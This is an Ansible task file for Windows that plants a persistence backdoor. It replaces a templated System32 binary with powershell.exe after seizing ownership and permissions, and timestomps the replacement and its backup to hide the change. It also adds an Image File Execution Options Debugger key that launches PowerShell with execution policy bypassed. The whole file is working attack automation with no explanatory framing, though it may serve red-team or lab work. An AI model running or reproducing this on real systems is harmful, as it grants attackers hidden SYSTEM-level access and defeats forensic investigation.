- name: "Get original file stats for {{ target }}"
  ansible.windows.win_stat:
    path: "C:\\Windows\\System32\\{{ target }}"
  register: file_info

- name: "Backdoor File Replacement for {{ target }}"
  ansible.windows.win_shell: |
    # 1. Take ownership and modify ACLs to allow replacement
    $targetPath = "C:\Windows\System32\{{ target }}"
    $Acl = Get-Acl $targetPath
    takeown /f $targetPath
    icacls $targetPath /grant administrators:F
    
    # 2. Backup original if backup doesn't exist
    $backupPath = "C:\Windows\System32\{{ target }}.outdated"
    if (-not (Test-Path $backupPath)) {
        Move-Item $targetPath $backupPath -Force
    }

    # 3. Replace with PowerShell
    Copy-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $targetPath -Force
    Set-Acl $targetPath $Acl

    # 4. Timestomp
    # Wrapping Jinja variables in quotes ensures they are treated as strings by Get-Date
    (Get-Item $targetPath).CreationTime = Get-Date "{{ file_info.stat.creationtime }}"
    (Get-Item $targetPath).LastWriteTime = Get-Date "{{ file_info.stat.lastwritetime }}"
    (Get-Item $targetPath).LastAccessTime = Get-Date "{{ file_info.stat.atime }}"

    (Get-Item $backupPath).CreationTime = Get-Date "{{ file_info.stat.creationtime }}"
    (Get-Item $backupPath).LastWriteTime = Get-Date "{{ file_info.stat.lastwritetime }}"
    (Get-Item $backupPath).LastAccessTime = Get-Date "{{ file_info.stat.atime }}"
  become: yes
  become_method: runas
  become_user: System

- name: "Apply IFEO Registry Redundancy for {{ target }}"
  community.windows.win_regedit:
    path: "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{{ target }}"
    name: Debugger
    data: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoExit'
    state: present